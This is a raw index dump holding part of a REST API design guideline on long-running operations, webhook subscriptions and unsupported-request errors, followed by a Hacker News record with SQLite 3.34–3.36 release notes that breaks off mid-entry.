the Retry-After header problematic. In that case, services MAY include, in the operationStatus JSON, a percent complete field. { \"createdDateTime\": \"2015-06-19T12-01-03.45Z\", \"percentComplete\": \"50\", \"status\": \"running\" } In this example the server has indicated to the client that the long running operation is 50% complete. 13.2.5.2 Target resource location For operations that result in, or manipulate, a resource the service MUST include the target resource location in the status upon operation completion. { \"createdDateTime\": \"2015-06-19T12-01-03.45Z\", \"lastActionDateTime\": \"2015-06-19T12-06-03.0024Z\", \"status\": \"succeeded\", \"resourceLocation\": \"https://api.contoso.com/v1.0/databases/db1\" } 13.2.6 Operation tombstones Services MAY choose to support tombstoned operations. Services MAY choose to delete tombstones after a service defined period of time. 13.2.7 The typical flow, polling Client invokes a stepwise operation by invoking an action using POST The server MUST indicate the request has been started by responding with a 202 Accepted status code. The response SHOULD include the location header containing a URL that the client should poll for the results after waiting the number of seconds specified in the Retry-After header. Client polls the location until receiving a 200 OK response from the server. 13.2.7.1 Example of the typical flow, polling Client invokes the restart action: POST https://api.contoso.com/v1.0/databases HTTP/1.1 Accept: application/json { \"fromFile\": \"myFile.db\", \"color\": \"red\" } The server response indicates the request has been created. HTTP/1.1 202 Accepted Operation-Location: https://api.contoso.com/v1.0/operations/123 Client waits for a period of time then invokes another request to try to get the operation status. GET https://api.contoso.com/v1.0/operations/123 Accept: application/json Server responds that results are still not ready and optionally provides a recommendation to wait 30 seconds. HTTP/1.1 200 OK Retry-After: 30 { \"createdDateTime\": \"2015-06-19T12-01-03.4Z\", \"status\": \"running\" } Client waits the recommended 30 seconds and then invokes another request to get the results of the operation. GET https://api.contoso.com/v1.0/operations/123 Accept: application/json Server responds with a \"status:succeeded\" operation that includes the resource location. HTTP/1.1 200 OK Content-Type: application/json { \"createdDateTime\": \"2015-06-19T12-01-03.45Z\", \"lastActionDateTime\": \"2015-06-19T12-06-03.0024Z\", \"status\": \"succeeded\", \"resourceLocation\": \"https://api.contoso.com/v1.0/databases/db1\" } 13.2.8 The typical flow, push notifications Client invokes a long running operation by invoking an action using POST. The client has a push notification already setup on the parent resource. The service indicates the request has been started by responding with a 202 Accepted status code. The client ignores everything else. Upon completion of the overall operation the service pushes a notification via the subscription on the parent resource. The client retrieves the operation result via the resource URL. 13.2.8.1 Example of the typical flow, push notifications existing subscription Client invokes the backup action. The client already has a push notification subscription setup for db1. POST https://api.contoso.com/v1.0/databases/db1?backup HTTP/1.1 Accept: application/json The server response indicates the request has been accepted. HTTP/1.1 202 Accepted Operation-Location: https://api.contoso.com/v1.0/operations/123 The caller ignores all the headers in the return. The target URL receives a push notification when the operation is complete. HTTP/1.1 200 OK Content-Type: application/json { \"value\": [ { \"subscriptionId\": \"1234-5678-1111-2222\", \"context\": \"subscription context that was specified at setup\", \"resourceUrl\": \"https://api.contoso.com/v1.0/databases/db1\", \"userId\" : \"contoso.com/user@contoso.com\", \"tenantId\" : \"contoso.com\" } ] } 13.2.9 Retry-After In the examples above the Retry-After header indicates the number of seconds that the client should wait before trying to get the result from the URL identified by the location header. The HTTP specification allows the Retry-After header to alternatively specify a HTTP date, so clients should be prepared to handle this as well. HTTP/1.1 202 Accepted Operation-Location: http://api.contoso.com/v1.0/operations/123 Retry-After: 60 Note: The use of the HTTP Date is inconsistent with the use of ISO 8601 Date Format used throughout this document, but is explicitly defined by the HTTP standard in [RFC 7231][rfc-7231-7-1-1-1]. Services SHOULD prefer the integer number of seconds (in decimal) format over the HTTP date format. 13.3 Retention policy for operation results In some situations, the result of a long running operation is not a resource that can be addressed. For example, if you invoke a long running Action that returns a Boolean (rather than a resource). In these situations, the Location header points to a place where the Boolean result can be retrieved. Which begs the question: \"How long should operation results be retained?\" A recommended minimum retention time is 24 hours. Operations SHOULD transition to \"tombstone\" for an additional period of time prior to being purged from the system. 14 Push notifications via webhooks 14.1 Scope Services MAY implement push notifications via web hooks. This section addresses the following key scenario: Push notification via HTTP Callbacks, often called Web Hooks, to publicly-addressable servers. The approach set forth is chosen due to its simplicity, broad applicability, and low barrier to entry for service subscribers. It's intended as a minimal set of requirements and as a starting point for additional functionality. 14.2 Principles The core principles for services that support web hooks are: Services MUST implement at least a poke/pull model. In the poke/pull model, a notification is sent to a client, and clients then send a request to get the current state or the record of change since their last notification. This approach avoids complexities around message ordering, missed messages, and change sets. Services MAY add more data to provide rich notifications. Services MUST implement the challenge/response protocol for configuring callback URLs. Services SHOULD have a recommended age-out period, with flexibility for services to vary based on scenario. Services SHOULD allow subscriptions that are raising successful notifications to live forever and SHOULD be tolerant of reasonable outage periods. Firehose subscriptions MUST be delivered only over HTTPS. Services SHOULD require other subscription types to be HTTPS. See the \"Security\" section for more details. 14.3 Types of subscriptions There are two subscription types, and services MAY implement either, both, or none. The supported subscription types are: Firehose subscriptions a subscription is manually created for the subscribing application, typically in an app registration portal. Notifications of activity that any users have consented to the app receiving are sent to this single subscription. Per-resource subscriptions the subscribing application uses code to programmatically create a subscription at runtime for some user-specific entity(s). Services that support both subscription types SHOULD provide differentiated developer experiences for the two types: Firehose Services MUST NOT require developers to create code except to directly verify and respond to notifications. Services MUST provide administrative UI for subscription management. Services SHOULD NOT assume that end users are aware of the subscription, only the subscribing application's functionality. Per-user Services MUST provide an API for developers to create and manage subscriptions as part of their app as well as verifying and responding to notifications. Services MAY expect end users to be aware of subscriptions and MUST allow end users to revoke subscriptions where they were created directly in response to user actions. 14.4 Call sequences The call sequence for a firehose subscription MUST follow the diagram below. It shows manual registration of application and subscription, and then the end user making use of one of the service's APIs. At this part of the flow, two things MUST be stored: The service MUST store the end user's act of consent to receiving notifications from this specific application (typically a background usage OAUTH scope.) The subscribing application MUST store the end user's tokens in order to call back for details once notified of changes. The final part of the sequence is the notification flow itself. Non-normative implementation guidance: A resource in the service changes and the service needs to run the following logic: Determine the set of users who have access to the resource, and could thus expect apps to receive notifications about it on their behalf. See which of those users have consented to receiving notifications and from which apps. See which apps have registered a firehose subscription. Join 1, 2, 3 to produce the concrete set of notifications that must be sent to apps. It should be noted that the act of user consent and the act of setting up a firehose subscription could arrive in either order. Services SHOULD send notifications with setup processed in either order. For a per-user subscription, app registration is either manual or automated. The call flow for a per-user subscription MUST follow the diagram below. It shows the end user making use of one of the service's APIs, and again, the same two things MUST be stored: The service MUST store the end user's act of consent to receiving notifications from this specific application (typically a background usage OAUTH scope). The subscribing application MUST store the end user's tokens in order to call back for details once notified of changes. In this case, the subscription is set up programmatically using the end-user's token from the subscribing application. The app MUST store the ID of the registered subscription alongside the user tokens. Non normative implementation guidance: In the final part of the sequence, when an item of data in the service changes and the service needs to run the following logic: Find the set of subscriptions that correspond via resource to the data that changed. For subscriptions created under an app+user token, send a notification to the app per subscription with the subscription ID and user id of the subscription-creator. For subscriptions created with an app only token, check that the owner of the changed data or any user that has visibility of the changed data has consented to notifications to the application, and if so send a set of notifications per user id to the app per subscription with the subscription ID. 14.5 Verifying subscriptions When subscriptions change either programmatically or in response to change via administrative UI portals, the subscribing service needs to be protected from malicious or unexpected calls from services pushing potentially large volumes of notification traffic. For all subscriptions, whether firehose or per-user, services MUST send a verification request as part of creation or modification via portal UI or API request, before sending any other notifications. Verification requests MUST be of the following format as an HTTP/HTTPS POST to the subscription's notificationUrl. POST https://{notificationUrl}?validationToken={randomString} ClientState: clientOriginatedOpaqueToken (if provided by client on subscription-creation) Content-Length: 0 For the subscription to be set up, the application MUST respond with 200 OK to this request, with the validationToken value as the sole entity body. Note that if the notificationUrl contains query parameters, the validationToken parameter must be appended with an &. If any challenge request does not receive the prescribed response within 5 seconds of sending the request, the service MUST return an error, MUST NOT create the subscription, and MUST NOT send further requests or notifications to notificationUrl. Services MAY perform additional validations on URL ownership. 14.6 Receiving notifications Services SHOULD send notifications in response to service data changes that do not include details of the changes themselves, but include enough information for the subscribing application to respond appropriately to the following process: Applications MUST identify the correct cached OAuth token to use for a callback Applications MAY look up any previous delta token for the relevant scope of change Applications MUST determine the URL to call to perform the relevant query for the new state of the service, which MAY be a delta query. Services that are providing notifications that will be relayed to end users MAY choose to add more detail to notification packets in order to reduce incoming call load on their service. Such services MUST be clear that notifications are not guaranteed to be delivered and may be lossy or out of order. Notifications MAY be aggregated and sent in batches. Applications MUST be prepared to receive multiple events inside a single push notification. The service MUST send all Web Hook data notifications as POST requests. Services MUST allow for a 30-second timeout for notifications. If a timeout occurs or the application responds with a 5xx response, then the service SHOULD retry the notification with exponential back-off. All other responses will be ignored. The service MUST NOT follow 301/302 redirect requests. 14.6.1 Notification payload The basic format for notification payloads is a list of events, each containing the id of the subscription whose referenced resources have changed, the type of change, the resource that should be consumed to identify the exact details of the change and sufficient identity information to look up the token required to call that resource. For a firehose subscription, a concrete example of this may look like: { \"value\": [ { \"subscriptionId\": \"32b8cbd6174ab18b\", \"resource\": \"https://api.contoso.com/v1.0/users/user@contoso.com/files?$delta\", \"userId\" : \"<User GUID>\", \"tenantId\" : \"<Tenant Id>\" } ] } For a per-user subscription, a concrete example of this may look like: { \"value\": [ { \"subscriptionId\": \"32b8cbd6174ab183\", \"clientState\": \"clientOriginatedOpaqueToken\", \"expirationDateTime\": \"2016-02-04T11:23Z\", \"resource\": \"https://api.contoso.com/v1.0/users/user@contoso.com/files/$delta\", \"userId\" : \"<User GUID>\", \"tenantId\" : \"<Tenant Id>\" }, { \"subscriptionId\": \"97b391179fa22\", \"clientState \": \"clientOriginatedOpaqueToken\", \"expirationDateTime\": \"2016-02-04T11:23Z\", \"resource\": \"https://api.contoso.com/v1.0/users/user@contoso.com/files/$delta\", \"userId\" : \"<User GUID>\", \"tenantId\" : \"<Tenant Id>\" } ] } Following is a detailed description of the JSON payload. A notification item consists a top-level object that contains an array of events, each of which identified the subscription due to which this notification is being sent. Field Description value Array of events that have been raised within the subscriptions scope since the last notification. Each item of the events array contains the following properties: Field Description subscriptionId The id of the subscription due to which this notification has been sent.Services MUST provide the subscriptionId field. clientState Services MUST provide the clientState field if it was provided at subscription creation time. expirationDateTime Services MUST provide the expirationDateTime field if the subscription has one. resource Services MUST provide the resource field. This URL MUST be considered opaque by the subscribing application. In the case of a richer notification it MAY be subsumed by message content that implicitly contains the resource URL to avoid duplication.If a service is providing this data as part of a more detailed data packet, then it need not be duplicated. userId Services MUST provide this field for user-scoped resources. In the case of user-scoped resources, the unique identifier for the user should be used.In the case of resources shared between a specific set of users, multiple notifications must be sent, passing the unique identifier of each user.For tenant-scoped resources, the user id of the subscription should be used. tenantId Services that wish to support cross-tenant requests SHOULD provide this field. Services that provide notifications on tenant-scoped data MUST send this field. 14.7 Managing subscriptions programmatically For per-user subscriptions, an API MUST be provided to create and manage subscriptions. The API must support at least the operations described here. 14.7.1 Creating subscriptions A client creates a subscription by issuing a POST request against the subscriptions resource. The subscription namespace is client-defined via the POST operation. https://api.contoso.com/apiVersion/$subscriptions The POST request contains a single subscription object to be created. That subscription object has the following properties: Property Name Required Notes resource Yes Resource path to watch. notificationUrl Yes The target web hook URL. clientState No Opaque string passed back to the client on all notifications. Callers may choose to use this to provide tagging mechanisms. If the subscription was successfully created, the service MUST respond with the status code 201 CREATED and a body containing at least the following properties: Property Name Required Notes id Yes Unique ID of the new subscription that can be used later to update/delete the subscription. expirationDateTime No Uses existing Microsoft REST API Guidelines defined time formats. Creation of subscriptions SHOULD be idempotent. The combination of properties scoped to the auth token, provides a uniqueness constraint. Below is an example request using a User + Application principal to subscribe to notifications from a file: POST https://api.contoso.com/files/v1.0/$subscriptions HTTP 1.1 Authorization: Bearer {UserPrincipalBearerToken} { \"resource\": \"http://api.service.com/v1.0/files/file1.txt\", \"notificationUrl\": \"https://contoso.com/myCallbacks\", \"clientState\": \"clientOriginatedOpaqueToken\" } The service SHOULD respond to such a message with a response format minimally like this: { \"id\": \"32b8cbd6174ab18b\", \"expirationDateTime\": \"2016-02-04T11:23Z\" } Below is an example using an Application-Only principal where the application is watching all files to which it's authorized: POST https://api.contoso.com/files/v1.0/$subscriptions HTTP 1.1 Authorization: Bearer {ApplicationPrincipalBearerToken} { \"resource\": \"All.Files\", \"notificationUrl\": \"https://contoso.com/myCallbacks\", \"clientState\": \"clientOriginatedOpaqueToken\" } The service SHOULD respond to such a message with a response format minimally like this: { \"id\": \"8cbd6174abb391179\", \"expirationDateTime\": \"2016-02-04T11:23Z\" } 14.7.2 Updating subscriptions Services MAY support amending subscriptions. To update the properties of an existing subscription, clients use PATCH requests providing the ID and the properties that need to change. Omitted properties will retain their values. To delete a property, assign a value of JSON null to it. As with creation, subscriptions are individually managed. The following request changes the notification URL of an existing subscription: PATCH https://api.contoso.com/files/v1.0/$subscriptions/{id} HTTP 1.1 Authorization: Bearer {UserPrincipalBearerToken} { \"notificationUrl\": \"https://contoso.com/myNewCallback\" } If the PATCH request contains a new notificationUrl, the server MUST perform validation on it as described above. If the new URL fails to validate, the service MUST fail the PATCH request and leave the subscription in its previous state. The service MUST return an empty body and 204 No Content to indicate a successful patch. The service MUST return an error body and status code if the patch failed. The operation MUST succeed or fail atomically. 14.7.3 Deleting subscriptions Services MUST support deleting subscriptions. Existing subscriptions can be deleted by making a DELETE request against the subscription resource: DELETE https://api.contoso.com/files/v1.0/$subscriptions/{id} HTTP 1.1 Authorization: Bearer {UserPrincipalBearerToken} As with update, the service MUST return 204 No Content for a successful delete, or an error body and status code to indicate failure. 14.7.4 Enumerating subscriptions To get a list of active subscriptions, clients issue a GET request against the subscriptions resource using a User + Application or Application-Only bearer token: GET https://api.contoso.com/files/v1.0/$subscriptions HTTP 1.1 Authorization: Bearer {UserPrincipalBearerToken} The service MUST return a format as below using a User + Application principal bearer token: { \"value\": [ { \"id\": \"32b8cbd6174ab18b\", \"resource\": \" http://api.contoso.com/v1.0/files/file1.txt\", \"notificationUrl\": \"https://contoso.com/myCallbacks\", \"clientState\": \"clientOriginatedOpaqueToken\", \"expirationDateTime\": \"2016-02-04T11:23Z\" } ] } An example that may be returned using Application-Only principal bearer token: { \"value\": [ { \"id\": \"6174ab18bfa22\", \"resource\": \"All.Files \", \"notificationUrl\": \"https://contoso.com/myCallbacks\", \"clientState\": \"clientOriginatedOpaqueToken\", \"expirationDateTime\": \"2016-02-04T11:23Z\" } ] } 14.8 Security All service URLs must be HTTPS (that is, all inbound calls MUST be HTTPS). Services that deal with Web Hooks MUST accept HTTPS. We recommend that services that allow client defined Web Hook Callback URLs SHOULD NOT transmit data over HTTP. This is because information can be inadvertently exposed via client, network, server logs and other mechanisms. However, there are scenarios where the above recommendations cannot be followed due to client endpoint or software limitations. Consequently, services MAY allow web hook URLs that are HTTP. Furthermore, services that allow client defined HTTP web hooks callback URLs SHOULD be compliant with privacy policy specified by engineering leadership. This will typically include recommending that clients prefer SSL connections and adhere to special precautions to ensure that logs and other service data collection are properly handled. For example, services may not want to require developers to generate certificates to onboard. Services might only enable this on test accounts. 15 Unsupported requests RESTful API clients MAY request functionality that is currently unsupported. RESTful APIs MUST respond to valid but unsupported requests consistent with this section. 15.1 Essential guidance RESTful APIs will often choose to limit functionality that can be performed by clients. For instance, auditing systems allow records to be created but not modified or deleted. Similarly, some APIs will expose collections but require or otherwise limit filtering and ordering criteria, or MAY not support client-driven pagination. 15.2 Feature allow list If a service does not support any of the below API features, then an error response MUST be provided if the feature is requested by a caller. The features are: Key Addressing in a collection, such as: https://api.contoso.com/v1.0/people/user1@contoso.com Filtering a collection by a property value, such as: https://api.contoso.com/v1.0/people?$filter=name eq 'david' Filtering a collection by range, such as: http://api.contoso.com/v1.0/people?$filter=hireDate ge 2014-01-01 and hireDate le 2014-12-31 Client-driven pagination via $top and $skip, such as: http://api.contoso.com/v1.0/people?$top=5&$skip=2 Sorting by $orderBy, such as: https://api.contoso.com/v1.0/people?$orderBy=name desc Providing $delta tokens, such as: https://api.contoso.com/v1.0/people?$delta 15.2.1 Error response Services MUST provide an error response if a caller requests an unsupported feature found in the feature allow list. The error response MUST be an HTTP status code from the 4xx series, indicating that the request cannot be fulfilled. Unless a more specific error status is appropriate for the given request, services SHOULD return \"400 Bad Request\" and an error payload conforming to the error response guidance provided in the Microsoft REST API Guidelines. Services SHOULD include enough detail in the response message for a developer to determine exactly what portion of the request is not supported. Example: GET https://api.contoso.com/v1.0/people?$orderBy=name HTTP/1.1 Accept: application/json HTTP/1.1 400 Bad Request Content-Type: application/json { \"error\": { \"code\": \"ErrorUnsupportedOrderBy\", \"message\": \"Ordering by name is not supported.\" } } 16 Appendix 16.1 Sequence diagram notes All sequence diagrams in this document are generated using the WebSequenceDiagrams.com web site. To generate them, paste the text below into the web tool. 16.1.1 Push notifications, per user flow === Being Text === note over Developer, Automation, App Server: An App Developer like MovieMaker Wants to integrate with primary service like Dropbox end note note over DB Portal, DB App Registration, DB Notifications, DB Auth, DB Service: The primary service like Dropbox note over Client: The end users' browser or installed app note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Manual App Registration Developer <--> DB Portal : Login into Portal, App Registration UX DB Portal -> +DB App Registration: App Name etc. note over DB App Registration: Confirm Portal Access Token DB App Registration -> -DB Portal: App ID DB Portal <--> App Server: Developer copies App ID note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Manual Notification Registration Developer <--> DB Portal: webhook registration UX DB Portal -> +DB Notifications: Register: App Server webhook URL, Scope, App ID Note over DB Notifications : Confirm Portal Access Token DB Notifications -> -DB Portal: notification ID DB Portal --> App Server : Developer may copy notification ID note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Client Authorization Client -> +App Server : Request access to DB protected information App Server -> -Client : Redirect to DB Authorization endpoint with authorization request Client -> +DB Auth : Redirected authorization request Client <--> DB Auth : Authorization UX DB Auth -> -Client : Redirect back to App Server with code Client -> +App Server : Redirect request back to access server with access code App Server -> +DB Auth : Request tokens with access code note right of DB Service: Cache that this User ID provided access to App ID DB Auth -> -App Server : Response with access, refresh, and ID tokens note right of App Server : Cache tokens by user ID App Server -> -Client : Return information to client note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Notification Flow Client <--> DB Service: Changes to user data - typical via interacting with App Server via Client DB Service -> App Server : Notification with notification ID and user ID App Server -> +DB Service : Request changed information with cached access tokens and \"since\" token note over DB Service: Confirm User Access Token DB Service -> -App Server : Response with data and new \"since\" token note right of App Server: Update status and cache new \"since\" token === End Text === 16.1.2 Push notifications, firehose flow === Being Text === note over Developer, Automation, App Server: An App Developer like MovieMaker Wants to integrate with primary service like Dropbox end note note over DB Portal, DB App Registration, DB Notifications, DB Auth, DB Service: The primary service like Dropbox note over Client: The end users' browser or installed app note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : App Registration alt Automated app registration Developer <--> Automation: Configure Automation -> +DB App Registration: App Name etc. note over DB App Registration: Confirm App Access Token DB App Registration -> -Automation: App ID, App Secret Automation --> App Server : Embed App ID, App Secret else Manual app registration Developer <--> DB Portal : Login into Portal, App Registration UX DB Portal -> +DB App Registration: App Name etc. note over DB App Registration: Confirm Portal Access Token DB App Registration -> -DB Portal: App ID DB Portal <--> App Server: Developer copies App ID end note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Client Authorization Client -> +App Server : Request access to DB protected information App Server -> -Client : Redirect to DB Authorization endpoint with authorization request Client -> +DB Auth : Redirected authorization request Client <--> DB Auth : Authorization UX DB Auth -> -Client : Redirect back to App Server with code Client -> +App Server : Redirect request back to access server with access code App Server -> +DB Auth : Request tokens with access code note right of DB Service: Cache that this User ID provided access to App ID DB Auth -> -App Server : Response with access, refresh, and ID tokens note right of App Server : Cache tokens by user ID App Server -> -Client : Return information to client note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Notification Registration App Server->+DB Notifications: Register: App server webhook URL, Scope, App ID note over DB Notifications : Confirm User Access Token DB Notifications -> -App Server: notification ID note right of App Server : Cache the Notification ID and User Access Token note over Developer, Automation, App Server, DB Portal, DB App Registration, DB Notifications, Client : Notification Flow Client <--> DB Service: Changes to user data - typical via interacting with App Server via Client DB Service -> App Server : Notification with notification ID and user ID App Server -> +DB Service : Request changed information with cached access tokens and \"since\" token note over DB Service: Confirm User Access Token DB Service -> -App Server : Response with data and new \"since\" token note right of App Server: Update status and cache new \"since\" token === End Text === ",
        "_version_": 1718527436917833728
      },
      {
        "story_id": [21163359],
        "story_author": ["QuadrupleA"],
        "story_descendants": [102],
        "story_score": [393],
        "story_time": ["2019-10-05T01:58:46Z"],
        "story_title": "Sqlite 3.30.0",
        "search": [
          "Sqlite 3.30.0",
          "https://www.sqlite.org/changes.html",
          "Small. Fast. Reliable.Choose any three. This page provides a high-level summary of changes to SQLite. For more detail, see the Fossil checkin logs at http://www.sqlite.org/src/timeline and http://www.sqlite.org/src/timeline?t=release. See the chronology a succinct listing of releases. 2021-06-18 (3.36.0) Improvement to the EXPLAIN QUERY PLAN output to make it easier to understand. Byte-order marks at the start of a token are skipped as if they were whitespace. An error is raised on any attempt to access the rowid of a VIEW or subquery. Formerly, the rowid of a VIEW would be indeterminate and often would be NULL. The -DSQLITE_ALLOW_ROWID_IN_VIEW compile-time option is available to restore the legacy behavior for applications that need it. The sqlite3_deserialize() and sqlite3_serialize() interfaces are now enabled by default. The -DSQLITE_ENABLE_DESERIALIZE compile-time option is no longer required. Instead, there is is a new -DSQLITE_OMIT_DESERIALIZE compile-time option to omit those interfaces. The \"memdb\" VFS now allows the same in-memory database to be shared among multiple database connections in the same process as long as the database name begins with \"/\". Back out the EXISTS-to-IN optimization (item 8b in the SQLite 3.35.0 change log) as it was found to slow down queries more often than speed them up. Improve the constant-propagation optimization so that it works on non-join queries. The REGEXP extension is now included in CLI builds. Hashes: SQLITE_SOURCE_ID: 2021-06-18 18:36:39 5c9a6c06871cb9fe42814af9c039eb6da5427a6ec28f187af7ebfb62eafa66e5 SHA3-256 for sqlite3.c: 2a8e87aaa414ac2d45ace8eb74e710935423607a8de0fafcb36bbde5b952d157 2021-04-19 (3.35.5) Fix defects in the new ALTER TABLE DROP COLUMN feature that could corrupt the database file. Fix an obscure query optimizer problem that might cause an incorrect query result. Hashes: SQLITE_SOURCE_ID: 2021-04-19 18:32:05 1b256d97b553a9611efca188a3d995a2fff712759044ba480f9a0c9e98fae886 SHA3-256 for sqlite3.c: e42291343e8f03940e57fffcf1631e7921013b94419c2f943e816d3edf4e1bbe 2021-04-02 (3.35.4) Fix a defect in the query planner optimization identified by item 8b above. Ticket de7db14784a08053. Fix a defect in the new RETURNING syntax. Ticket 132994c8b1063bfb. Fix the new RETURNING feature so that it raises an error if one of the terms in the RETURNING clause references a unknown table, instead of silently ignoring that error. Fix an assertion associated with aggregate function processing that was incorrectly triggered by the push-down optimization. Hashes: SQLITE_SOURCE_ID: 2021-04-02 15:20:15 5d4c65779dab868b285519b19e4cf9d451d50c6048f06f653aa701ec212df45e SHA3-256 for sqlite3.c: 528b8a26bf5ffd4c7b4647b5b799f86e8fb1a075f715b87a414e94fba3d09dbe 2021-03-26 (3.35.3) Enhance the OP_OpenDup opcode of the bytecode engine so that it works even if the cursor being duplicated itself came from OP_OpenDup. Fix for ticket bb8a9fd4a9b7fce5. This problem only came to light due to the recent MATERIALIZED hint enhancement. When materializing correlated common table expressions, do so separately for each use case, as that is required for correctness. This fixes a problem that was introduced by the MATERIALIZED hint enhancement. Fix a problem in the filename normalizer of the unix VFS. Fix the \"box\" output mode in the CLI so that it works with statements that returns one or more rows of zero columns (such as PRAGMA incremental_vacuum). Forum post afbbcb5b72. Improvements to error messages generated by faulty common table expressions. Forum post aa5a0431c99e. Fix some incorrect assert() statements. Fix to the SELECT statement syntax diagram so that the FROM clause syntax is shown correctly. Forum post 9ed02582fe. Fix the EBCDIC character classifier so that it understands newlines as whitespace. Forum post 58540ce22dcd. Improvements the xBestIndex method in the implementation of the (unsupported) wholenumber virtual table extension so that it does a better job of convincing the query planner to avoid trying to materialize a table with an infinite number of rows. Forum post b52a020ce4. Hashes: SQLITE_SOURCE_ID: 2021-03-26 12:12:52 4c5e6c200adc8afe0814936c67a971efc516d1bd739cb620235592f18f40be2a SHA3-256 for sqlite3.c: 91ca6c0a30ebfdba4420bb35f4fd9149d13e45fc853d86ad7527db363e282683 2021-03-17 (3.35.2) Fix a problem in the appendvfs.c extension that was introduced into version 3.35.0. Ensure that date/time functions with no arguments (which generate responses that depend on the current time) are treated as non-deterministic functions. Ticket 2c6c8689fb5f3d2f Fix a problem in the sqldiff utility program having to do with unusual whitespace characters in a virtual table definition. Limit the new UNION ALL optimization described by item 8c in the 3.35.0 release so that it does not try to make too many new subqueries. See forum thread 140a67d3d2 for details. Hashes: SQLITE_SOURCE_ID: 2021-03-17 19:07:21 ea80f3002f4120f5dcee76e8779dfdc88e1e096c5cdd06904c20fd26d50c3827 SHA3-256 for sqlite3.c: e8edc7b1512a2e050d548d0840bec6eef83cc297af1426c34c0ee8720f378a11 2021-03-15 (3.35.1) Fix a bug in the new DROP COLUMN feature when used on columns that are indexed and that are quoted in the index definition. Improve the built-in documentation for the .dump command in the CLI. Hashes: SQLITE_SOURCE_ID: 2021-03-15 16:53:57 aea12399bf1fdc76af43499d4624c3afa17c3e6c2459b71c195804bb98def66a SHA3-256 for sqlite3.c: fc79e27fd030226c07691b7d7c23aa81c8d46bc3bef5af39060e1507c82b0523 2021-03-12 (3.35.0) Added built-in SQL math functions(). (Requires the -DSQLITE_ENABLE_MATH_FUNCTIONS compile-time option.) Added support for ALTER TABLE DROP COLUMN. Generalize UPSERT: Allow multiple ON CONFLICT clauses that are evaluated in order, The final ON CONFLICT clause may omit the conflict target and yet still use DO UPDATE. Add support for the RETURNING clause on DELETE, INSERT, and UPDATE statements. Use less memory when running VACUUM on databases containing very large TEXT or BLOB values. It is no longer necessary to hold the entire TEXT or BLOB in memory all at once. Add support for the MATERIALIZED and NOT MATERIALIZED hints when specifying common table expressions. The default behavior was formerly NOT MATERIALIZED, but is now changed to MATERIALIZED for CTEs that are used more than once. The SQLITE_DBCONFIG_ENABLE_TRIGGER and SQLITE_DBCONFIG_ENABLE_VIEW settings are modified so that they only control triggers and views in the main database schema or in attached database schemas and not in the TEMP schema. TEMP triggers and views are always allowed. Query planner/optimizer improvements: Enhancements to the min/max optimization so that it works better with the IN operator and the OP_SeekScan optimization of the previous release. Attempt to process EXISTS operators in the WHERE clause as if they were IN operators, in cases where this is a valid transformation and seems likely to improve performance. Allow UNION ALL sub-queries to be flattened even if the parent query is a join. Use an index, if appropriate, on IS NOT NULL expressions in the WHERE clause, even if STAT4 is disabled. Expressions of the form \"x IS NULL\" or \"x IS NOT NULL\" might be converted to simply FALSE or TRUE, if \"x\" is a column that has a \"NOT NULL\" constraint and is not involved in an outer join. Avoid checking foreign key constraints on an UPDATE statement if the UPDATE does not modify any columns associated with the foreign key. Allow WHERE terms to be pushed down into sub-queries that contain window functions, as long as the WHERE term is made up of entirely of constants and copies of expressions found in the PARTITION BY clauses of all window functions in the sub-query. CLI enhancements: Enhance the \".stats\" command to accept new arguments \"stmt\" and \"vmstep\", causing prepare statement statistics and only the virtual-machine step count to be shown, respectively. Add the \".filectrl data_version\" command. Enhance the \".once\" and \".output\" commands so that if the destination argument begins with \"|\" (indicating that output is redirected into a pipe) then the argument does not need to be quoted. Bug fixes: Fix a potential NULL pointer dereference when processing a syntactically incorrect SELECT statement with a correlated WHERE clause and a \"HAVING 0\" clause. (Also fixed in the 3.34.1 patch release.) Fix a bug in the IN-operator optimization of version 3.33.0 that can cause an incorrect answer. Fix incorrect answers from the LIKE operator if the pattern ends with \"%\" and there is an \"ESCAPE '_'\" clause. Hashes: SQLITE_SOURCE_ID: 2021-03-12 15:10:09 acd63062eb06748bfe9e4886639e4f2b54ea6a496a83f10716abbaba4115500b SHA3-256 for sqlite3.c: 73a740d881735bef9de7f7bce8c9e6b9e57fe3e77fa7d76a6e8fc5c262fbaedf 2021-01-20 (3.34.1) Fix a potential use-after-free bug when processing a a subquery with both a correlated WHERE clause and a \"HAVING 0\" clause and where the parent query is an aggregate. Fix documentation typos Fix minor problems in extensions. Hashes: SQLITE_SOURCE_ID: 2021-01-20 14:10:07 10e20c0b43500cfb9bbc0eaa061c57514f715d87238f4d835880cd846b9ebd1f SHA3-256 for sqlite3.c: 799a7be90651fc7296113b641a70b028c142d767b25af1d0a78f93dcf1a2bf20 2020-12-01 (3.34.0) Added the sqlite3_txn_state() interface for reporting on the current transaction state of the database connection. Enhance recursive common table expressions to support two or more recursive terms as is done by SQL Server, since this helps make queries against graphs easier to write and faster to execute. Improved error messages on CHECK constraint failures. CLI enhancements: The .read dot-command now accepts a pipeline in addition to a filename. Added options --data-only and --nosys to the .dump dot-command. Added the --nosys option to the .schema dot-command. Table name quoting works correctly for the .import dot-command. The generate_series(START,END,STEP) table-valued function extension is now built into the CLI. The .databases dot-command now shows the status of each database file as determined by sqlite3_db_readonly() and sqlite3_txn_state(). Added the --tabs command-line option that sets .mode tabs. The --init option reports an error if the file named as its argument cannot be opened. The --init option also now honors the --bail option. Query planner improvements: Improved estimates for the cost of running a DISTINCT operator. When doing an UPDATE or DELETE using a multi-column index where only a few of the earlier columns of the index are useful for the index lookup, postpone doing the main table seek until after all WHERE clause constraints have been evaluated, in case those constraints can be covered by unused later terms of the index, thus avoiding unnecessary main table seeks. The new OP_SeekScan opcode is used to improve performance of multi-column index look-ups when later columns are constrained by an IN operator. The BEGIN IMMEDIATE and BEGIN EXCLUSIVE commands now work even if one or more attached database files are read-only. Enhanced FTS5 to support trigram indexes. Improved performance of WAL mode locking primitives in cases where there are hundreds of connections all accessing the same database file at once. Enhanced the carray() table-valued function to include a single-argument form that is bound using the auxiliary sqlite3_carray_bind() interface. The substr() SQL function can now also be called \"substring()\" for compatibility with SQL Server. The syntax diagrams are now implemented as Pikchr scripts and rendered as SVG for improved legibility and ease of maintenance. Hashes: 